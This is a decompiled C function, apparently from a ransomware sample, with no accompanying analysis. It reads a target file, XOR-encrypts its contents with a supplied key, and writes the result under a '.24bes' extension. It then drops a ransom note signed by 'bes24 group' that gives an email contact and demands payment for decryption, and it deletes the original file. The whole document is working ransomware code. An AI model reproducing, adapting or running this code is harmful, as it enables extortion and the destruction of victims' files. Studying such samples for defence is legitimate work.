void encrypt_file(char *param_1,char *param_2)

{
  byte bVar1;
  ulong uVar2;
  int iVar3;
  size_t sVar4;
  char local_848 [1024];
  char local_448 [1032];
  FILE *local_40;
  void *local_38;
  size_t local_30;
  FILE *local_28;
  ulong local_20;
  
  local_28 = fopen(param_1,"rb");
  if (local_28 == (FILE *)0x0) {
    printf("Error opening file: %s\n",param_1);
  }
  else {
    fseek(local_28,0,2);
    local_30 = ftell(local_28);
    rewind(local_28);
    local_38 = malloc(local_30);
    fread(local_38,1,local_30,local_28);
    fclose(local_28);
    for (local_20 = 0; uVar2 = local_20, (long)local_20 < (long)local_30; local_20 = local_20 + 1) {
      bVar1 = *(byte *)((long)local_38 + local_20);
      sVar4 = strlen(param_2);
      *(byte *)((long)local_38 + local_20) = bVar1 ^ param_2[uVar2 % sVar4];
    }
    snprintf(local_448,0x400,"%s.24bes",param_1);
    local_28 = fopen(local_448,"wb");
    fwrite(local_38,1,local_30,local_28);
    fclose(local_28);
    free(local_38);
    snprintf(local_848,0x400,"%s_note.txt",local_448);
    local_40 = fopen(local_848,"w");
    if (local_40 == (FILE *)0x0) {
      printf("Error creating note file: %s\n",local_848);
    }
    else {
      fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..\n"
             ,1,0x99,local_40);
      fclose(local_40);
    }
    iVar3 = remove(param_1);
    if (iVar3 != 0) {
      printf("Error deleting original file: %s\n",param_1);
    }
  }
  return;
}
